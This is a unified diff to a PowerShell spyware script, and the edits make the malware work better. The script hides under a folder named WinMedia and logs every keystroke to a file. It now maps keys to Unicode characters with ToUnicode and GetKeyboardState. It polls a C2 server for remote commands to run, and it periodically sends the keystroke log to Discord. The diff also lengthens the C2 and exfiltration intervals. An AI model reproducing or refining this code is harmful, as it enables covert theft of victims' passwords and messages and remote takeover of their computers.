@@ -7,7 +7,7 @@ $dir        = "$env:LOCALAPPDATA\WinMedia"
 if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
 $logFile = "$dir\data.txt"
 
-# 2. Rebuilt Native C# Keyboard State Engine
+# 2. Rebuilt Native C# Keyboard State Engine (Fixed structural variable overlapping)
 $Source = @'
 using System;
 using System.Text;
@@ -27,19 +27,19 @@ $discordInterval = 0
 $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
 
 while ($true) {
-    # ================= ENGINE A: HIGH-SPEED MODIFIER KEYLOGGER =================
-    # Query Shift and Control modifier states directly from the OS tracking tables
+    # ================= ENGINE A: HIGH-SPEED UNICODE MODIFIER KEYLOGGER =================
+    # Track core modifier maps cleanly prior to processing individual loop steps
     $isShiftActive = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
     $isCtrlActive  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))
 
-    for ($i = 8; $i -le 190; $i++) {
-        if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
+    for ($loopIdx = 8; $loopIdx -le 190; $loopIdx++) {
+        if ([KeyEngine]::GetAsyncKeyState($loopIdx) -eq -32767) {
             $keyText = ""
             
-            # Skip lone layout modifier taps to prevent log clutter
-            if ($i -eq 16 -or $i -eq 17 -or $i -eq 18 -or $i -eq 160 -or $i -eq 161 -or $i -eq 162 -or $i -eq 165) { continue }
+            # Prevent lone structural modifier states from dirtying the log output arrays
+            if ($loopIdx -eq 16 -or $loopIdx -eq 17 -or $loopIdx -eq 18 -or $loopIdx -eq 160 -or $loopIdx -eq 161 -or $loopIdx -eq 162 -or $loopIdx -eq 165) { continue }
 
-            switch ($i) {
+            switch ($loopIdx) {
                 8   { $keyText = " [BACKSPACE] " }
                 9   { $keyText = " [TAB] " }
                 13  { $keyText = "`n" }
@@ -49,20 +49,26 @@ while ($true) {
                 32  { $keyText = " " }
                 46  { $keyText = " [DEL] " }
                 default {
-                    $rawChar = [char]$i
-                    
-                    # Process combo variations relative to live modifier maps
+                    # Handle hotkey combination matrices raw
                     if ($isCtrlActive) { 
+                        $rawChar = [char]$loopIdx
                         $keyText = " [CTRL+$rawChar] " 
-                    } elseif ($isShiftActive) { 
-                        # Handle letter values or shift combinations cleanly
-                        if ($i -ge 65 -and $i -le 90) {
-                            $keyText = $rawChar.ToString().ToUpper() 
-                        } else {
-                            $keyText = " [SHIFT+$rawChar] "
+                    } else {
+                        # FIXED: Completely isolated mapping scopes prevent $loopIdx corruption
+                        $keyState = New-Object byte[] 256
+                        [KeyEngine]::GetKeyboardState($keyState) | Out-Null
+                        
+                        # Explicitly pass Shift status directly into the memory matrix layout
+                        if ($isShiftActive) { $keyState[16] = 0x80 }
+                        
+                        $scanCode = [KeyEngine]::MapVirtualKey($loopIdx, 0)
+                        $buffer = New-Object System.Text.StringBuilder 5
+
+                        # The returned tracking integer uses a distinct variable ($returnCode) to avoid index corruption
+                        $returnCode = [KeyEngine]::ToUnicode($loopIdx, $scanCode, $keyState, $buffer, $buffer.Capacity, 0)
+                        if ($returnCode -gt 0) { 
+                            $keyText = $buffer.ToString() 
                         }
-                    } else { 
-                        $keyText = $rawChar.ToString().ToLower() 
                     }
                 }
             }
@@ -74,7 +80,7 @@ while ($true) {
     }
 
     # ================= ENGINE B: REMOTE RCE POLLING LOOP =================
-    if ($c2Interval -ge 500) {
+    if ($c2Interval -ge 1000) {
         try {
             $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
             if ($cmdResponse -and $cmdResponse -ne 'wait') {
@@ -89,7 +95,7 @@ while ($true) {
     }
 
     # ================= ENGINE C: DISCORD EXFILTRATION LOOP =================
-    if ($discordInterval -ge 6000) {
+    if ($discordInterval -ge 12000) {
         if (Test-Path $logFile) {
             if ((Get-Item $logFile).Length -gt 0) {
                 try {
@@ -103,6 +109,7 @@ while ($true) {
         $discordInterval = 0
     }
 
+    # High-precision delay timing optimized for flawless keystroke scanning accuracy
     Start-Sleep -m 5
     $c2Interval += 5
     $discordInterval += 5
